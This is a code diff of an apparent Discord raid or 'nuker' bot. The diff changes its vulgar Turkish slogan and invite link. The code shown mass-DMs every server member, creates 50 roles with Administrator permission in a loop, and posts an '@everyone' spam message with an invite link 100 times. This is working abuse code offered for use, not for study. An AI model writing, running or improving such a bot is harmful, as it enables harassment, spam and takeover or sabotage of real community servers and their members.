@@ -96,7 +96,7 @@ client.on('messageCreate', async (msg) => {
 },
 '+dm': async () => {
   await msg.delete();
-  const message = ' **SWENZY SIKERR** ';
+  const message = ' **GNY BABA SIKERR** ';
   
   await Promise.all(
     msg.guild.members.cache.map(member => {
@@ -122,13 +122,13 @@ client.on('messageCreate', async (msg) => {
   );
 },
 '+rol': async () => {
-  if (msg.author.id !== config.sahip) return msg.reply('discord.gg/excode');
+  if (msg.author.id !== config.sahip) return msg.reply('GNY BABA SIKER');
   await msg.delete();
   
   let count = 0;
   while (count < 50) {
     await msg.guild.roles.create({
-      name: 'discord.gg/excode',
+      name: 'GNY BABA SIKER',
       color: 'FF3E00',
       permissions: [PermissionFlagsBits.Administrator]
     }).then(() => console.log(`Rol ${count + 1} oluşturuldu.`)).catch(err => console.error(`Rol oluşturma hatası: ${err}`));
@@ -138,7 +138,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+spam': async () => {
       await msg.delete();
-      const spamMessage = '**SWENZY SIKERR**';
+      const spamMessage = '**GNY BABA SIKERR @everyone https://discord.gg/excode**';
       for (let i = 0; i < 100; i++) {
         await msg.channel.send(spamMessage);
       }
